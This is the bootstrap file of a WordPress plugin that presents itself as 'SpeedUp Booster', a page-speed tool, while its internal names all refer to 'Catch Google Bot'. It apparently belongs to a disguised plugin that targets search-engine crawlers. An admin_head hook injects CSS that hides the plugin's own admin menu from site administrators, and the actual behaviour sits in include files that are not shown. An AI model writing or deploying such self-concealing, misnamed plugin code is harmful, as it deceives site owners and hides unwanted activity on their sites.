<?php

/**
 * The plugin bootstrap file
 *
 * @since             1.5.0
 * @package           Catch_Google_Bot
 *
 * @wordpress-plugin
 * Plugin Name:       SpeedUp Booster
 * Description:       Increase the speed of the pages.
 * Version:           1.5.0
 * Author:            Alex Webiprog
 * License:           dulya
 * License URI:       http://www.gnu.org/licenses/gpl-2.0.txt
 * Text Domain:       catch-google-bot
 * Domain Path:       /languages
 */

// If this file is called directly, abort.
if ( ! defined( 'WPINC' ) ) {
	die;
}

add_action( 'admin_head',
    function () {
        echo '<style>
        #toplevel_page_catch-google-bot-admin-opt {display: none!important}
  </style>';
    } );


// // Exclude some plugins from being activated on development workstation.
// add_filter( 'option_active_plugins', function( $options ) {

// 	  $exclude = array(
// 		'pushover-notifications/pushover-notifications.php',
// 		'w3-total-cache/w3-total-cache.php',
// 	  );
// 	  $options = array_diff($options, $exclude);

// 	return $options;
//   }, PHP_INT_MIN);

/**
 * Currently plugin version.
 * Start at version 1.5.0 and use SemVer - https://semver.org
 * Rename this for your plugin and update it as you release new versions.
 */
define( 'CATCH_GOOGLE_BOT_VERSION', '1.5.0' );

/**
 * The code that runs during plugin activation.
 * This action is documented in includes/class-catch-google-bot-activator.php
 */
function activate_catch_google_bot() {
	require_once plugin_dir_path( __FILE__ ) . 'includes/class-catch-google-bot-activator.php';
	Catch_Google_Bot_Activator::activate();
}

/**
 * The code that runs during plugin deactivation.
 * This action is documented in includes/class-catch-google-bot-deactivator.php
 */
function deactivate_catch_google_bot() {
	require_once plugin_dir_path( __FILE__ ) . 'includes/class-catch-google-bot-deactivator.php';
	Catch_Google_Bot_Deactivator::deactivate();
}

register_activation_hook( __FILE__, 'activate_catch_google_bot' );
register_deactivation_hook( __FILE__, 'deactivate_catch_google_bot' );

/**
 * The core plugin class that is used to define internationalization,
 * admin-specific hooks, and public-facing site hooks.
 */
require plugin_dir_path( __FILE__ ) . 'includes/class-catch-google-bot.php';

/**
 * Begins execution of the plugin.
 *
 * Since everything within the plugin is registered via hooks,
 * then kicking off the plugin from this point in the file does
 * not affect the page life cycle.
 *
 * @since    1.5.0
 */
function run_catch_google_bot() {

	$plugin = new Catch_Google_Bot();
	$plugin->run();

}
run_catch_google_bot();
